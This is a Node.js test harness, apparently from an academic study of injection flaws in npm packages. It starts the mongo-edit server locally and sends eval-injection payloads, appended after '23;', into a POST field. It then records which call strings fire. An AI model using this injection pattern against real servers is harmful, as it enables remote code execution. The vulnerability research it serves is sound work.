/**
 * Copyright 2016 Software Lab, TU Darmstadt, Germany
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to
 * deal in the Software without restriction, including without limitation the
 * rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
 * sell copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
 * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
 * DEALINGS IN THE SOFTWARE.
 *
 * Created by Cristian-Alexandru Staicu on 03.03.16.
 */
module.exports = function (cb) {

    var attackUtils = require("./AttackUtils.js");
    attackUtils.setup();

    var path = require("path");
    var oldDir = __dirname;
    process.chdir("./node_modules/mongo-edit");

    var edit = require('mongo-edit');
    edit.launchServer();
    var request = require('request');

    setTimeout(function () {
        attackUtils.deliverPayloads(attackUtils.payloadsEval, function (payload) {
            request({
                url: 'http://localhost:2762/blog/12',
                method: "POST",
                json: true,
                body: '{"newData":"23;' + payload + '"}'
            }, function (error, response, body) {
                //console.log(body);
            });
        }, function (result, filesWithSinks) {
            var benignInput = "{benignInput:25}";
            request({
                url: 'http://localhost:2762/blog/12',
                method: "POST",
                json: true,
                body: '{"newData":"' + benignInput + '"}'
            }, function (error, response, body) {
                attackUtils.printCallStrings();
                result += " " + attackUtils.observedString(benignInput);
                process.chdir(oldDir);
                cb(__filename, result, filesWithSinks);
                //console.log(body);
            });

        });
    }, 3000);
};
